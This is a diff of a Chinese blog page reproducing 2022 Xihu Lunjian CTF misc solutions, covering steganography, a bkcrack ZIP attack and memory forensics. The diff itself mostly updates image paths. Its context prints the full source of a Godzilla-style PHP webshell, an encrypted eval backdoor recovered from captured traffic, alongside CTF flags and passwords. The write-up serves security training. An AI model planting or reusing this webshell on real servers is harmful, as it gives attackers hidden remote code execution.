@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/background/fj_img/21.jpg">
 <meta property="article:published_time" content="2023-11-30T12:54:04.000Z">
-<meta property="article:modified_time" content="2023-11-30T13:20:34.961Z">
+<meta property="article:modified_time" content="2024-03-05T06:12:38.627Z">
 <meta property="article:author" content="dddkia">
 <meta property="article:tag" content="misc">
 <meta property="article:tag" content="wp">
@@ -362,48 +362,48 @@
 <h2 id="mp3"><strong>mp3</strong></h2>
 <p>拿到cipher.mp3，听一下，熟悉的可以一下分辨出这是<code>mp3stego</code>的默认加解密音频，因为没有密码，先看看010</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/170134897029315.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/170134897029315.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>看到有个png，foremost分离一下</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/17013489702651.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/17013489702651.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>拿到只有黑白像素的png图片</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/17013489702662.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/17013489702662.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>按行转成010的二进制值然后再转成16进制数保存为文件看看</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Bash">from PIL import Image<br>import struct<br><br>img = Image.open(<span class="hljs-string">&#x27;00000646.png&#x27;</span>)<br>width, height = img.size<br><br>f = open(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#按行读取</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> range(height):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(width):<br>        flag += str(img.getpixel((x, y))//255)  <span class="hljs-comment">#255//255 = 1 ; 0//255 = 0</span><br><span class="hljs-comment">#print(flag)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, len(flag), 8):<br>    f.write(struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, int(flag[i:i+8], 2)))<br>f.close()<br></code></pre></td></tr></table></figure>
 <p><code>50 4B 03 04</code>拿到zip，里面有个加密的47.txt</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/17013489702663.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/17013489702663.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>尝试了一下不是伪加密，回到mp3stego，无密码直接解密得到压缩包密码<code>8750d5109208213f</code></p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/17013489702664.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/17013489702664.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>拿到47.txt</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj<br></code></pre></td></tr></table></figure>
 <p>由47联想到rot47</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/17013489702665.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/17013489702665.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>类似jjencode，console直接解得到flag：DASCTF{f8097257d699d7fdba7e97a15c4f94b4}</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/17013489702666.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/17013489702666.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <h2 id="take_the_zip_easy">take_the_zip_easy</h2>
 <p>拿到zipeasy.zip，里面是两个加密的文件，看到两个文件名字一样，猜想zip是pcapng压缩得到的，而且加密算法为ZipCrypto，有两段偏移可能相同，30-43：<code>64 61 73 66 6C 6F 77 2E 70 63 61 70 6E 67</code>，0-3：<code>50 4B 03 04</code></p>
 <p>尝试明文攻击</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/170134897026613.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/170134897026613.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p><code>bkcrack.exe -C zipeasy.zip -x 30 646173666C6F772E706361706E67 -x 0 504B0304 -c dasflow.zip</code></p>
@@ -414,7 +414,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;air123&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
 <p><code>stream 36</code>哥斯拉流量解密得到加密flag.zip的原始命令，得到密码<code>airDAS1231qaSW@</code></p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/170134897026714.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/170134897026714.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>写脚本解密也行</p>
@@ -438,7 +438,7 @@ target="_blank" rel="noopener" href="https://crazymanarmy.github.io/2023/02/03/�
 <p>Hint:
 hint1:在张三的电脑上发现一张截图，看起来应该是配置跳板机时无意留下的。</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/17013489702667.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/17013489702667.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>hint2:为什么这个Windows内存镜像是ELF格式？
@@ -461,7 +461,7 @@ hint3:https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-D
 <p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 screenshot -D ./</code></p>
 <p>看到上面有一串mac地址</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/17013489702668.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/17013489702668.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>netscan看看网络连接</p>
@@ -477,7 +477,7 @@ hint3:https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-D
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Volatility Foundation Volatility Framework 2.6<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br>Writing mstsc.exe [  2840] to 2840.dmp<br></code></pre></td></tr></table></figure>
 <p>修改成.data后缀，用gimp调一下参，得到提示不在RAM中</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/17013489702669.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/17013489702669.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>再看回hint1，有vbox显示器的分辨率、显卡等信息</p>
@@ -497,14 +497,14 @@ systems.</p>
 <p><code>dd if=CharlieBrown-PC.elf of=vram skip=3757890092 bs=1 count=33554432</code></p>
 <p>建议手动，dd命令会很久</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/170134897026610.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/170134897026610.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>保存为VRAM，观察发现4字节一组，代表RGBA，由hint1的分辨率得到图片宽高，编写脚本将data转成图片</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>width = <span class="hljs-number">1440</span><br>height = <span class="hljs-number">900</span><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;VRAM&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makeSourceImg</span>():<br>    img = Image.new(<span class="hljs-string">&#x27;RGBA&#x27;</span>, (width, height))<br>    x = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            img.putpixel((j, i), (flag[x], flag[x + <span class="hljs-number">1</span>], flag[x + <span class="hljs-number">2</span>],flag[x+<span class="hljs-number">3</span>]))<br>            x += <span class="hljs-number">4</span><br>    <span class="hljs-keyword">return</span> img<br><br>img = makeSourceImg()<br>img.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br></code></pre></td></tr></table></figure>
 <p>得到png，这就是对应刚刚的远程桌面的屏幕截图</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/170134897026611.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/170134897026611.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>拿到c</p>
@@ -513,7 +513,7 @@ systems.</p>
 <p>在线网站解析公钥http://www.hiencode.com/pub_asys.html，拿到n和e，n可以直接分解得到p，q</p>
 <p>e=2，rabin</p>
 <figure>
-<img src="../img/2022西湖论剑MISC复现/170134897026612.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2022西湖论剑MISC复现/170134897026612.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>这道题目是一道比较新也很巧妙的题，利用了vbox虚拟机elf core
